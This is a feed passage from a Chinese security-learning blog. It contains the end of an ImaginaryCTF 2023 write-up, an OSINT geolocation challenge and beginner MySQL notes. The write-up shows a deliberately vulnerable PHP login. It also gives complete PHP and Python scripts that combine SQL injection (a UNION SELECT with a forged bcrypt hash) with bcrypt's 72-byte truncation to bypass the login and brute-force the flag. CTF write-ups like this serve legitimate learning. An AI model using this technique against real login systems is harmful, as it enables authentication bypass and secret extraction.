class_">SQLite3</span>(<span class="hljs-string">&#x27;/db.sqlite3&#x27;</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$magic</span>])) &#123;<br>    <span class="hljs-variable">$password</span> .= <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$password</span>) &#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">querySingle</span>(<span class="hljs-string">&quot;SELECT username, pwhash FROM users WHERE username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>) &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Invalid username or password&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-variable">$password</span>, <span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;pwhash&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$u</span> = <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Welcome <span class="hljs-subst">$u</span>! But there is no flag here :P&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;&lt;!-- magic: <span class="hljs-subst">$magic</span> --&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Invalid username or password&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">#下面html中还嵌着一个&lt;?= $msg ?&gt;</span><br></code></pre></td></tr></table></figure><p><code>??</code>：php8新加入的，如果前面的变量不存在，就将后面的默认字符串赋值，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;FLAG&#x27;</span>] ?? <span class="hljs-string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>;<span class="hljs-comment">#如果无法从环境变量中获取到FLAG，那么就把后面的那个赋值给$flag</span><br><span class="hljs-variable">$magic</span> = <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">&#x27;MAGIC&#x27;</span>] ?? <span class="hljs-string">&#x27;aabbccdd11223344&#x27;</span>;<span class="hljs-comment">#同理</span><br><span class="hljs-comment">#主打的就是一个保险（</span><br></code></pre></td></tr></table></figure><p>在学习安全的路上首次亮相<code>password_verify()</code>函数亮相，判断变量$password的hash值是否等于第二个参数(存入数据库当中的经哈希处理后的字符串)，然后还要$res[‘username’]为’admin’，怎么想了想和上一题blank好像很像，至于构造hash字符串编码，php中有对应的<code>password_hash()</code>函数，先随便生成个密码看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$input</span>,PASSWORD_DEFAULT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hash</span>;<br><br><span class="hljs-comment">#output:$2y$10$gJWTsCxZTfjNlqN7hVqCF.QKzQ6giNnSpayWxWvG6gnOUTikgJ3Im</span><br></code></pre></td></tr></table></figure><p>嗯。。在这之前我一定测试过字段数，我一定不是随便写两个字段下去的</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724015219040.png"></p><p>总之和上一道题差不多的操作之后，成功让password验证成功，看一眼注释，拿到那个magic：</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724015352137.png"></p><p>回到源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-variable">$magic</span>])) &#123;<br>    <span class="hljs-variable">$password</span> .= <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>是的，没错。。是<code>.=</code>我从第一眼就没见到那个点点，这为我之后的懵逼历程埋下了大大的伏笔。。。</p><p>什么意思呢，如果有GET传入$magic，也就是<code>688a35c685a7a654abc80f8e123ad9f0</code>，那么password变量就会与flag拼接起来，这也将是我们之后的突破口。</p><p>然后开始懵逼，最开始没看到那个点点，一度想尝试过爆破逐一比对hash，结果捏，三四十个预选字符，长度大概二十多三十多吧，也就40多的30多次方种情况吧，不多不多（</p><p>然后就求助与学长了，其实当时如果自己去<a href="https://www.php.net/manual/en/function.password-hash.php">php官网</a>有目的性地查找，是能够查询到password_hash的相关特性的</p><p>使用PASSWORD_BCRYPY算法加密，被加密字符串最多长72个字节，这是官方给出的描述</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724020238024.png"></p><p>当时我没去自己查相关特性，求助了L1ao学长，他给了个<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify"><strong>trick</strong></a>，这个trick讲的其实更加直白，很容易看懂意图所在，但是真的从刚开始就把<code>.=</code>看成 <code>=</code>了呜呜呜呜呜，下面是trick的内容</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724161504043.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSW<br>False<br><br><span class="hljs-variable">$cont</span>=<span class="hljs-number">72</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSW<br>True<br></code></pre></td></tr></table></figure><p>PASSWORD_BCRYPT加密的时候只对前72个字节加密，超过72字节的部分不管，根据这个我们可以得出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT)<br>//False<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">72</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT)<br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">71</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;i&#x27;</span><br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">70</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;ic&#x27;</span><br>//True<br><span class="hljs-variable">$cont</span>=<span class="hljs-number">69</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>), <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$cont</span>).<span class="hljs-string">&quot;b&quot;</span>, PASSWORD_BCRYPT).<span class="hljs-string">&#x27;ict&#x27;</span><br>//True<br>........                               <br></code></pre></td></tr></table></figure><p>由于是传入<code>$magic</code>之后<code>$password</code>是拼接在用户传入的部分后面的，(这里我们暂称重复的71个’a’为冗余字节)所以可以从71一个一个减少用户传入的冗余字节数，每次减少一个字节数之后，遍历候选字符集，拼接在冗余字节<strong>和已知password部分</strong>后面(不要每次都只拼接在冗余字节后面，要爆出来一个就紧跟在a后面)</p><p>最开始的时候不知道为啥闲着没事就用php而不是python写了一个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&#x27;</span>;<br><span class="hljs-variable">$pre</span> = <span class="hljs-string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?&#123;&#125;_&quot;</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$pre</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$re</span> = <span class="hljs-number">71</span>;<span class="hljs-variable">$re</span> &gt; <span class="hljs-number">0</span>;<span class="hljs-variable">$re</span>--)&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>)&#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>);<br>        <span class="hljs-variable">$password</span> =  <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-variable">$re</span>).<span class="hljs-variable">$flag</span>.<span class="hljs-variable">$i</span>, PASSWORD_BCRYPT);<br>        <span class="hljs-variable">$post</span> = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;password&#x27;</span> =&gt; <span class="hljs-variable">$username</span>,<br>            <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;\&#x27; union select \&#x27;admin\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;\&#x27;--&#x27;</span><br>        );<br>        <span class="hljs-comment">#echo $post[&#x27;username&#x27;];</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$post</span>);<br>        <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POST, <span class="hljs-number">1</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$post</span>); <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>); <br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$res</span>,<span class="hljs-string">&#x27;Welcome&#x27;</span>))&#123;<br>            <span class="hljs-variable">$flag</span> .= <span class="hljs-variable">$i</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">#echo $res;</span><br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有点小慢，问chatgpt知道python里是有一个bcrypy库的，于是再写了个python脚本，写完之后发现其实速度大差不差</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> bcrypt<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>pre = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?1234567890&#125;&#123;_&quot;</span><br><span class="hljs-keyword">for</span> re <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">71</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pre:<br>        <span class="hljs-comment">#print(flag)</span><br>        password = <span class="hljs-string">&quot;a&quot;</span> * re<br>        username = <span class="hljs-string">&quot;a&quot;</span> * re + flag + i<br><br>        hashed_password = bcrypt.hashpw(username.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), bcrypt.gensalt())<br>        post_data = &#123;<br>            <span class="hljs-string">&#x27;password&#x27;</span>: password,<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;\&#x27; union select \&#x27;admin\&#x27;,\&#x27;&#x27;</span> + hashed_password.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;\&#x27;--&#x27;</span><br>        &#125;<br>        <span class="hljs-comment">#print(&quot;username:&quot;+username+&quot;\n&quot;)</span><br>        <span class="hljs-comment">#print(post_data)</span><br>        url = <span class="hljs-string">&#x27;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&#x27;</span><br><br>        response = requests.post(url, data=post_data)<br>        res = response.text<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Welcome&#x27;</span> <span class="hljs-keyword">in</span> res:<br>            flag += i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>超酷的好吗</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724022049089.png"></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Signpost"><a href="#Signpost" class="headerlink" title="Signpost"></a>Signpost</h3><p>一道社工题，给了个路标，找经纬度，大致能看清图片上信息：</p><ol><li>距SCOTTSDALE STADIUM 761英里</li><li>距离POLO(?)GROUNDS 2925英里</li><li>距SEALS STADIUM2英里</li></ol><p><img src="/2023/07/23/imaginary-ctf/signpost.png"></p><p>本来，按理来说是要分别找到这三个已知点的经纬度，根据距离画三个圆，三个圆的交点便是目标点附近，但是。。</p><p>根据题目描述，这个地方是在一个ball park主题公园，当时我在快乐搜索这三个已知点的时候</p><p><img src="/2023/07/23/imaginary-ctf/seals.jpg"></p><p>直觉告诉我这就是题目要的ballpark，Google Earth，启动！！</p><p>emmmm，我不管！！肯定就是Oracle Park！！</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724165912622.png"></p><p>获取经纬度</p><p><img src="/2023/07/23/imaginary-ctf/image-20230724165959400.png"></p><p>联想到社工误差较大，给了一定的容错空间</p><p>但是就在附近的话经纬度变化不会太大</p><p>377.779±0.03,-122.389±0.03</p><p>试了十几次试出来了</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROIS_Summer</title>
    <link href="/2023/07/09/ROIS-Summer/"/>
    <url>/2023/07/09/ROIS-Summer/</url>
    
    <content type="html"><![CDATA[<h1 id="ROIS夏令营"><a href="#ROIS夏令营" class="headerlink" title="ROIS夏令营"></a>ROIS夏令营</h1><hr><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="MySQL学习记录"><a href="#MySQL学习记录" class="headerlink" title="MySQL学习记录"></a>MySQL学习记录</h3><h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>配置环境参考<a href="https://potatowo233.github.io/2023/04/05/docker-note/#Docker-%E9%83%A8%E7%BD%B2-MySQL">docker-note中文章</a></p><p>默认在3306端口运行MySQL服务。</p><p>数据库管理系统：</p><p>用来管理数据库中数据的，对数据增删查改。常见：<code>MySQL、DB2、Oracle</code>等。</p><p><strong>执行MySQL命令时注意以分号结尾，不见分号不执行</strong></p><p><strong>SQL语句不区分大小写</strong></p><p>常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show databases;#查看有哪些数据库<br>use &lt;DB&gt;;#使用某个数据库(自带4个数据库，SQLI注入时与其中某些息息相关，存有数据库表名等等信息)<br>create database &lt;DB&gt;;#创建数据库<br>exit;#退出<br>show tables;#查看某个数据库内的表<br></code></pre></td></tr></table></figure><p>表(<strong>table</strong>)：</p><p>行(row)</p><p>列(字段)(<strong>column</strong>)</p><p>SQL语句：</p><p>DQL：数据查询语言(带SELECT)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT &lt;字段名&gt; FROM &lt;表名&gt;#如果查询多个字段字段间用逗号隔开，查询全部用*或者一个一个字段敲进去，星号效率低，实际开发不建议使用<br>SELECT &lt;字段1&gt;,&lt;字段2&gt;,&lt;字段3&gt;... FROM &lt;表名&gt; WHERE &lt;条件&gt;;#条件中&gt;、&lt;、&gt;=、&lt;=、=不用赘述，between .. and ..介于两者之间(左小右大)、&lt;&gt;或!=不等于、or 或、and 与<br>#同大多数编程语言一样，and优先级高于or，最好用括号明确逻辑层次<br>SELECT<br>...<br>FROM<br>...<br>WHERE<br>...<br>GROUP BY<br>...<br>ORDER  BY<br>...;#关键字顺序不能错<br></code></pre></td></tr></table></figure><p>DML：数据操作语言(对表当中数据增删改)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT#增<br>DELETE#删<br>UPDATE#改<br></code></pre></td></tr></table></figure><p>DDL：数据定义语言(CREATE、DROP、ALTER，主要操作表结构而不是修改数据，如删掉某列，增加新的一个字段、创建、删除表)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE#新建<br>ALTER#修改<br>DROP#删除<br>#不同于DML对表数据的增删改，DDL是对表结构进行操作<br></code></pre></td></tr></table></figure><p>TCL：事务控制语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">COMMIT#事务提交<br>ROLLBACK#事务回滚<br></code></pre></td></tr></table></figure><p>DCL：数据控制语言</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#eg:<br>GRAND#授权<br>REVOKE#撤销权限<br></code></pre></td></tr></table></figure><p>下面用上面学到操作的先制作一个测试用数据库练练手</p><p>先看一下有哪些数据库 <code>show databases;</code>，之前复现题目环境时创建了个flag数据库，正好可以试下删除数据库的操作</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150139318.png"></p><p><code>use flag;</code>进入该数据库，<code>show tables;</code>查看数据库内所有表</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150816476.png"></p><p>浅查一下</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709150912146.png"></p><p>查完，删表跑路（bushi</p><p>可以看到我们的test数据库内只有一个flag表，下面删除该表<code>drop table flag;</code></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709151149295.png"></p><p>使用<code>drop table &lt;表名&gt;;</code>删表，这时候我们再查数据库中的表名，已经是空的了，那一不做二不休，试一下删数据库<code>drop database flag;</code></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709152945576.png"></p><p>可以看到flag数据库已经被删除了。</p><p>这里先开navicat可视化快速创个数据库然后导出，一会尝试从文件导入</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709153841466.png"></p><p>导入文件的时候踩了个坑(其实还有个坑，这个坑也是几乎所有编程语言共有的，养成良好习惯从我做起（，路径中憋整中文)</p><p>使用命令<code>source &lt;file_url&gt;;</code>导入sql文件(意外发现其实source命令也可以不需要分号，但是养成好习惯，都加)</p><p>要先选中一个数据库再导入</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709160434502.png"></p><p>如图所示便导入成功：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709161124060.png"></p><p>查看表结构，不看数据，使用<code>describe &lt;表名&gt;;</code>命令(或者<code>desc &lt;表名&gt;</code>也可)</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709162429614.png"></p><p>然后感觉自己创的表太草率了，找了个更好的数据库导入了（</p><p>下面进行desc查表结构以及使用as关键字对查询字段起别名(注意as只对一个字段生效)(as可省，但是注意别名和真名间不要有逗号)：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709172305350.png"></p><p><strong>起别名不对原表字段名造成影响</strong></p><p><strong>SELECT语句永远无法进行修改操作</strong></p><p><strong>在所有数据库中，字符串是用单引号括起来的，双引号在Oracle中无法使用但是在MySQL中可以，例别名中有空格别名用单引号括起来</strong></p><p>字段可以使用数学表达式：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230709180029404.png"></p><p><img src="/2023/07/09/ROIS-Summer/image-20230709180041731.png"></p><h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p> MySQL中NULL不能用&#x3D;衡量，只能用<code>is/is not</code>，因为数据库中的NULL是表示该位置为空，而不是一个值，是一个属性</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710141543103.png"></p><p>IN关键字(等价于多个or)，取反用not in()：</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710143250340.png"></p><p>like(模糊查询，sql注入会使用到)：</p><ul><li>‘%’匹配任意个字符（可理解为正则表达式<code>.*?</code>）；</li><li>‘_’一个下划线只匹配一个字符（可以理解为正则表达式的<code>.</code>）；</li></ul><p>eg：</p><p>查询名字里含有字符’o’的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%o%&#x27;;<br></code></pre></td></tr></table></figure><p>OUTPUT:</p><p><img src="/2023/07/09/ROIS-Summer/image-20230710144012932.png"></p><p>eg：</p><p>以T结尾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%T&#x27;;<br></code></pre></td></tr></table></figure><p>以K开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;K%&#x27;;<br></code></pre></td></tr></table></figure><p>找出第二个字母是A的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;_A%&#x27;;<br></code></pre></td></tr></table></figure><p>找出含下划线的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select ename from emp where ename like &#x27;%\_%&#x27;;#使用转义字符&#x27;\&#x27;<br></code></pre></td></tr></table></figure><p>order by排序：</p><p><code>order by sal</code>默认升序，指定降序<code>order by sal desc</code>(descend)，指定升序<code>order by sal asc</code>(ascend)</p><p>多字段排序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#查询员工名字和薪资，要求按照薪资升序，薪资相同按照名字升序<br>select ename,sal from emp order by sal asc,ename 